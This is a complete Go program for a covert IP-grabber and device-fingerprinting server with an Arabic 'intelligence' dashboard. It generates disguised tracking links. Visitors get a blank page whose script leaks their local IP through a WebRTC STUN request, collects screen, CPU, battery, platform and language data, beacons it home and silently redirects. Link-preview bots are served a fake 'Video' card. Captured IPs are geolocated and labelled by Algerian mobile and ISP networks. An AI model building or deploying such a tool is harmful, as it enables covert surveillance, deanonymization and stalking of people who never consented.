package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"strings"
	"time"

	_ "modernc.org/sqlite"
)

var db *sql.DB

type Capture struct {
	ID         int
	Code       string
	PublicIP   string
	LocalIP    string
	Port       string
	Location   string
	DeviceInfo string
	CreatedAt  string
}

type PageData struct {
	GeneratedLink string
	Captures      []Capture
}

func initDB() {
	var err error
	db, err = sql.Open("sqlite", "./long_term_tracker.db")
	if err != nil {
		panic(err)
	}

	db.SetMaxOpenConns(25)
	db.SetMaxIdleConns(25)
	db.SetConnMaxLifetime(5 * time.Minute)

	createTablesSQL := `
	CREATE TABLE IF NOT EXISTS links (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		code TEXT UNIQUE,
		target_url TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);
	CREATE TABLE IF NOT EXISTS captures (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		code TEXT,
		public_ip TEXT,
		local_ip TEXT,
		port TEXT,
		location TEXT,
		device_info TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);
	CREATE INDEX IF NOT EXISTS idx_captures_code ON captures(code);
	CREATE INDEX IF NOT EXISTS idx_captures_created ON captures(created_at);
	`
	_, err = db.Exec(createTablesSQL)
	if err != nil {
		panic(err)
	}
}

func getRealIP(r *http.Request) string {
	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded != "" {
		ips := strings.Split(forwarded, ",")
		return strings.TrimSpace(ips[0])
	}
	ip := r.RemoteAddr
	if idx := strings.LastIndex(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}
	return ip
}

func getISPAndLocation(ip string, ua string) string {
	if ip == "127.0.0.1" || ip == "::1" || strings.HasPrefix(ip, "192.168.") {
		return "Local Network / Internal"
	}

	lowerUA := strings.ToLower(ua)
	if strings.Contains(lowerUA, "telegram") {
		return "Telegram Bot [Preview]"
	}
	if strings.Contains(lowerUA, "whatsapp") {
		return "WhatsApp Bot [Preview]"
	}
	if strings.Contains(lowerUA, "facebookexternalhit") || strings.Contains(lowerUA, "messenger") {
		return "Meta Bot [Preview]"
	}

	resp, err := http.Get(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,city,isp,org", ip))
	if err != nil {
		return "Algeria (Trace)"
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var result map[string]interface{}
	json.Unmarshal(body, &result)

	if status, ok := result["status"].(string); ok && status == "success" {
		city, _ := result["city"].(string)
		country, _ := result["country"].(string)
		if country == "" {
			country = "Algeria"
		}
		isp, _ := result["isp"].(string)
		if isp == "" {
			isp, _ = result["org"].(string)
		}

		lowerISP := strings.ToLower(isp)
		networkType := fmt.Sprintf(" [%s]", isp)
		if strings.Contains(lowerISP, "mobilis") {
			networkType = " [⚡ Mobilis]"
		} else if strings.Contains(lowerISP, "djezzy") || strings.Contains(lowerISP, "ota") {
			networkType = " [🔥 Djezzy]"
		} else if strings.Contains(lowerISP, "ooredoo") || strings.Contains(lowerISP, "wataniya") {
			networkType = " [⭐ Ooredoo]"
		} else if strings.Contains(lowerISP, "algerie telecom") || strings.Contains(lowerISP, "atm") {
			networkType = " [🌐 Algérie Télécom]"
		}

		locStr := country
		if city != "" {
			locStr = city + ", " + country
		}
		return locStr + networkType
	}
	return "Algeria (Trace)"
}

func mainHandler(w http.ResponseWriter, r *http.Request) {
	code := r.URL.Query().Get("r")

	if code != "" {
		var targetURL string
		err := db.QueryRow("SELECT target_url FROM links WHERE code = ?", code).Scan(&targetURL)
		if err != nil {
			http.Error(w, "Link not found", http.StatusNotFound)
			return
		}

		ua := r.UserAgent()
		isBot := strings.Contains(strings.ToLower(ua), "bot") ||
			strings.Contains(strings.ToLower(ua), "whatsapp") ||
			strings.Contains(strings.ToLower(ua), "telegram") ||
			strings.Contains(strings.ToLower(ua), "facebookexternalhit")

		if isBot {
			publicIP := getRealIP(r)
			location := getISPAndLocation(publicIP, ua)
			db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
				code, publicIP, "Bot", "N/A", location, "🤖 [Bot Preview] UA: "+ua[:40])

			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta property="og:title" content="Video"><meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600"></head><body></body></html>`)
			return
		}

		if r.Method == http.MethodPost {
			r.ParseForm()
			publicIP := getRealIP(r)
			localIP := r.FormValue("lip")
			if localIP == "" {
				localIP = "Unknown"
			}
			port := r.RemoteAddr
			location := getISPAndLocation(publicIP, ua)

			deviceInfo := fmt.Sprintf("OS: %s | Screen: %s | Cores: %s | Battery: %s | Lang: %s",
				r.FormValue("platform"), r.FormValue("screen"), r.FormValue("hardware"), r.FormValue("battery"), r.FormValue("lang"))

			db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
				code, publicIP, localIP, port, location, deviceInfo)

			w.WriteHeader(http.StatusOK)
			w.Write([]byte("OK"))
			return
		}

		htmlContent := fmt.Sprintf(`<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <script>
        function getLocalIP(callback) {
            let found = false;
            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                let ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                if (ipMatch) {
                    let ip = ipMatch[1];
                    if ((ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) && !found) {
                        found = true; callback(ip); pc.onicecandidate = null;
                    }
                }
            };
            setTimeout(() => { if (!found) callback("Cellular/Direct"); }, 50);
        }

        async function extractAndRedirect() {
            let screenRes = window.screen.width + "x" + window.screen.height;
            let cores = navigator.hardwareConcurrency || "N/A";
            let platform = navigator.platform || "N/A";
            let lang = navigator.language || "N/A";
            let batteryInfo = "N/A";
            try {
                if (navigator.getBattery) {
                    let b = await navigator.getBattery();
                    batteryInfo = Math.round(b.level * 100) + "%%";
                }
            } catch(e){}

            getLocalIP(function(lip) {
                let params = new URLSearchParams();
                params.append('lip', lip);
                params.append('screen', screenRes);
                params.append('hardware', cores);
                params.append('battery', batteryInfo);
                params.append('platform', platform);
                params.append('lang', lang);

                navigator.sendBeacon ? navigator.sendBeacon(window.location.href, params) : fetch(window.location.href, {method: 'POST', body: params, keepalive:true});

                setTimeout(() => {
                    window.location.replace("%s");
                }, 90);
            });
        }
        window.addEventListener('DOMContentLoaded', extractAndRedirect);
    </script>
</head>
<body style="background:#000;"></body>
</html>`, targetURL)
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(htmlContent))
		return
	}

	var generatedLink string
	if r.Method == http.MethodPost {
		r.ParseForm()
		targetURL := r.FormValue("target_url")
		customCode := r.FormValue("custom_code")

		if targetURL != "" {
			if !strings.HasPrefix(targetURL, "http") {
				targetURL = "https://" + targetURL
			}

			codeGen := customCode
			if codeGen == "" {
				codeGen = fmt.Sprintf("%d", time.Now().UnixNano())[8:]
			}

			_, err := db.Exec("INSERT INTO links (code, target_url) VALUES (?, ?)", codeGen, targetURL)
			if err == nil {
				scheme := "https"
				if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" {
					scheme = "http"
				}
				generatedLink = fmt.Sprintf("%s://%s/?r=%s", scheme, r.Host, codeGen)
			}
		}
	}

	rows, _ := db.Query("SELECT id, code, public_ip, local_ip, port, location, device_info, created_at FROM captures ORDER BY id DESC LIMIT 50")
	defer rows.Close()

	var captures []Capture
	for rows.Next() {
		var c Capture
		rows.Scan(&c.ID, &c.Code, &c.PublicIP, &c.LocalIP, &c.Port, &c.Location, &c.DeviceInfo, &c.CreatedAt)
		captures = append(captures, c)
	}

	data := PageData{
		GeneratedLink: generatedLink,
		Captures:      captures,
	}

	tmpl := `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة الاستخبارات</title>
    <style>
        body { background: #0b0f17; color: #e2e8f0; font-family: sans-serif; padding: 15px; }
        .box { background: #131b2e; border: 1px solid #1e293b; padding: 15px; border-radius: 8px; margin-bottom: 15px; max-width: 900px; margin-left: auto; margin-right: auto; }
        input[type="text"] { width: 100%; padding: 10px; background: #020617; border: 1px solid #334155; color: #fff; border-radius: 5px; margin-bottom: 10px; }
        button { background: #6366f1; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; }
        .result { background: #020617; border: 1px solid #10b981; padding: 10px; border-radius: 5px; margin-top: 10px; word-break: break-all; }
        .table-wrap { width: 100%; overflow-x: auto; }
        table { width: 100%; min-width: 600px; border-collapse: collapse; margin-top: 10px; font-size: 12px; }
        th, td { border: 1px solid #1e293b; padding: 8px; text-align: center; }
        th { background: #020617; color: #94a3b8; }
    </style>
</head>
<body>
    <div class="box">
        <h3>توليد رابط تتبع (مع خانة الرمز المخصص)</h3>
        <form method="POST">
            <input type="text" name="target_url" placeholder="الرابط المستهدف (مثال: tiktok.com/...)" required autocomplete="off">
            <input type="text" name="custom_code" placeholder="رمز التتبع المخصص (اختياري)" autocomplete="off">
            <button type="submit">إنشاء الرابط</button>
        </form>
        {{if .GeneratedLink}}
        <div class="result">
            <strong>الرابط النشط:</strong><br>
            <a href="{{.GeneratedLink}}" target="_blank" style="color: #38bdf8;">{{.GeneratedLink}}</a>
        </div>
        {{end}}
    </div>

    <div class="box" style="max-width: 1100px;">
        <h3>سجلات الاستخبارات المركزة</h3>
        <div class="table-wrap">
            <table>
                <tr>
                    <th>ID</th>
                    <th>الرمز</th>
                    <th>IP العام</th>
                    <th>IP المحلي</th>
                    <th>المزود والشبكة</th>
                    <th>تفاصيل العتاد والنظام</th>
                    <th>الوقت</th>
                </tr>
                {{range .Captures}}
                <tr>
                    <td>{{.ID}}</td>
                    <td style="color:#6366f1; font-weight:bold;">{{.Code}}</td>
                    <td style="color:#38bdf8;">{{.PublicIP}}</td>
                    <td style="color:#fbbf24;">{{.LocalIP}}</td>
                    <td style="color:#10b981;">{{.Location}}</td>
                    <td style="color:#fb7185;">{{.DeviceInfo}}</td>
                    <td>{{.CreatedAt}}</td>
                </tr>
                {{end}}
            </table>
        </div>
    </div>
</body>
</html>`

	t, _ := template.New("index").Parse(tmpl)
	t.Execute(w, data)
}

func main() {
	initDB()
	http.HandleFunc("/", mainHandler)
	fmt.Println("[*] Server running on port 8080...")
	http.ListenAndServe(":8080", nil)
}
